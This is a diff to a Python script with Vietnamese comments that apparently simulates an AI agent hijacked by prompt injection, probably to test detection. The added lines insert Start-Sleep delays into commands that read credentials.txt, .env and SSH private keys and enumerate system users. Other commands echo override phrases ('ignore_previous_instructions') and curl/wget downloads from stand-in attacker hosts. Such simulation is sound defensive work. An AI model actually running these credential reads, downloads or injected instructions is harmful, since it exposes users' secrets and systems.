@@ -74,12 +74,12 @@ def scenario_1():
     # Gia lap AI Agent bi tiem Prompt Injection va chay lenh
     run_cmd(
         "AI bi tiem Prompt Injection, thuc thi PowerShell doc hai",
-        'powershell.exe -Command "echo ignore_previous_instructions; echo jailbreak_payload; echo system_prompt_override"'
+        'powershell.exe -Command "Start-Sleep -Seconds 5; echo ignore_previous_instructions; echo jailbreak_payload; echo system_prompt_override"'
     )
 
     run_cmd(
         "Mo phong AI doc file payload tu attacker",
-        'powershell.exe -Command "Write-Host \'AI Agent executing injected payload...\'"'
+        'powershell.exe -Command "Start-Sleep -Seconds 5; Write-Host [ATTACK] AI Agent executing injected payload"'
     )
 
 # ============================================================
@@ -97,17 +97,17 @@ def scenario_2():
 
     run_cmd(
         "AI thu doc file credentials.txt",
-        'powershell.exe -Command "Get-Content credentials.txt -ErrorAction SilentlyContinue"'
+        'powershell.exe -Command "Start-Sleep -Seconds 5; Get-Content credentials.txt -ErrorAction SilentlyContinue"'
     )
 
     run_cmd(
         "AI thu doc file .env (chua API keys)",
-        'powershell.exe -Command "Get-Content .env -ErrorAction SilentlyContinue"'
+        'powershell.exe -Command "Start-Sleep -Seconds 5; Get-Content .env -ErrorAction SilentlyContinue"'
     )
 
     run_cmd(
         "AI thu doc SSH private key",
-        'powershell.exe -Command "Get-ChildItem -Path $env:USERPROFILE\\.ssh -Filter id_rsa -ErrorAction SilentlyContinue"'
+        'powershell.exe -Command "Start-Sleep -Seconds 5; Get-ChildItem -Path $env:USERPROFILE\\.ssh -Filter id_rsa -ErrorAction SilentlyContinue"'
     )
 
 # ============================================================
@@ -125,17 +125,17 @@ def scenario_3():
 
     run_cmd(
         "AI chay PowerShell de do tham mang noi bo",
-        'powershell.exe -Command "Test-NetConnection -ComputerName localhost -Port 445"'
+        'powershell.exe -Command "Start-Sleep -Seconds 5; Test-NetConnection -ComputerName localhost -Port 445"'
     )
 
     run_cmd(
         "AI dung cmd.exe de liet ke user he thong",
-        'cmd.exe /c "net user"'
+        'cmd.exe /c "ping -n 5 127.0.0.1 > nul & net user"'
     )
 
     run_cmd(
         "AI chay PowerShell voi IEX (Invoke Expression) nguy hiem",
-        'powershell.exe -Command "Write-Host \'Simulating IEX payload execution...\'"'
+        'powershell.exe -Command "Start-Sleep -Seconds 5; Write-Host [ATTACK] Simulating IEX payload execution"'
     )
 
 # ============================================================
@@ -159,13 +159,13 @@ def scenario_4():
 
     run_cmd(
         "AI dung curl tai ma doc",
-        'powershell.exe -Command "Write-Host \"[ATTACK] curl http://attacker.com/payload.exe\""',
+        'powershell.exe -Command "Start-Sleep -Seconds 5; Write-Host [ATTACK] curl http://attacker.com/payload.exe"',
         wait=3
     )
 
     run_cmd(
         "AI dung wget tai script doc hai",
-        'powershell.exe -Command "Write-Host \"[ATTACK] wget http://malicious.site/backdoor.exe\""',
+        'powershell.exe -Command "Start-Sleep -Seconds 5; Write-Host [ATTACK] wget http://malicious.site/backdoor.exe"',
         wait=3
     )
 
